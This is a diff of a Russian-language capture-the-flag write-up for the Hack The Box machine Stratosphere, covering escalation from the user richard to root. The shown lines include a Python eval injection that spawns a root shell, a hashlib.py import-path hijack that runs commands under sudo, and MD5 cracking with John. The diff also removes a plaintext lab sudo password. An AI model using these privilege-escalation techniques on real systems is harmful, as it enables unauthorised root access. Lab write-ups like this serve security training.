@@ -703,7 +703,6 @@ lrwxrwxrwx 1 root root      10 Jan 20  2017 /usr/bin/python3m -> python3.5m
 В [этом](https://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html "Vipul Chaskar's Blog: Exploiting eval() function in Python") посте хорошо описан механизм эксплуатации функции `eval()` для Пайтона, а я же просто ~~поимею~~ получу root-сессию:
 ```
 richard@stratosphere:~$ sudo /usr/bin/python2 ~/test.py
-[sudo] password for richard: 9tc*rhKuG5TyXvUJOrE^5CK7k
 Solve: 5af003e100c80923ec04d65933d382cb
 __import__('os').system('/bin/bash')
 root@stratosphere:/home/richard# whoami
@@ -714,6 +713,14 @@ root@stratosphere:/home/richard# cat /root/root.txt
 d41d8cd9????????????????????????
 ```
 
+Кстати, уже сейчас можно разоблачить негодяев, удостоверившись в том, что обещанного `/root/success.py` не существует:
+```
+root@stratosphere:/home/richard# ls /root/success.py
+ls: cannot access '/root/success.py': No such file or directory
+```
+
+Но в [конце]({{ page.url }}#хеши) райтапа мы все же сломаем пару хешей. Так, разминки ради.
+
 ## PrivEsc: richard ⟶ root. Способ 2
 В начале исходника нельзя не заметить импорт библиотеки `hashlib` для вычисления хеш-значений вводимых строк. Угоним же эту библиотеку?
 
@@ -723,9 +730,9 @@ richard@stratosphere:~$ python -c 'import sys; print(sys.path)'
 ['', '/usr/lib/python35.zip', '/usr/lib/python3.5', '/usr/lib/python3.5/plat-x86_64-linux-gnu', '/usr/lib/python3.5/lib-dynload', '/usr/local/lib/python3.5/dist-packages', '/usr/lib/python3/dist-packages']
 ```
 
-Пустые кавычки в начале означают текущую директорию, из которой был запущен интерпретатор. То что нам нужно, я считаю!
+Пустые кавычки в начале означают текущий каталог (CWD). То что нам нужно, я считаю!
 
-Создадим фейковую библиотеку `hashlib.py` с нужным нам пейлоадом (можно построить реверс-шелл, но для простоты я ограничусь просто выводом флага на экран — идея ясна):
+Создадим фейковую библиотеку `hashlib.py` с нужным нам пейлоадом (можно построить реверс-шелл, или так же получить root-сессию, как и в первом способе, но для простоты я ограничусь просто выводом флага на экран — идея ясна):
 ```
 richard@stratosphere:~$ echo 'import os; os.system("cat /root/root.txt")' > hashlib.py
 
@@ -738,7 +745,6 @@ richard@stratosphere:~$ ls -l *.py
 И со спокойной совестью запустим скрипт:
 ```
 richard@stratosphere:~$ sudo /usr/bin/python ~/test.py
-[sudo] password for richard: 9tc*rhKuG5TyXvUJOrE^5CK7k
 d41d8cd9????????????????????????
 Solve: 5af003e100c80923ec04d65933d382cb
 ^C
@@ -751,6 +757,7 @@ richard@stratosphere:~$ rm /dev/shm/input* /dev/shm/output*
 ```
 
 # Разное
+## Хеши
 Шутки ради попрошу своего друга Джона решить предлагаемые тестом хеши:
 ```
 root@kali:~# echo '5af003e100c80923ec04d65933d382cb' > strat.md5
@@ -782,7 +789,6 @@ Fhero6610
 Скормим их `/home/richard/test.py`:
 ```
 richard@stratosphere:~$ sudo /usr/bin/python ~/test.py
-[sudo] password for richard: 9tc*rhKuG5TyXvUJOrE^5CK7k
 Solve: 5af003e100c80923ec04d65933d382cb
 kaybboo!
 You got it!
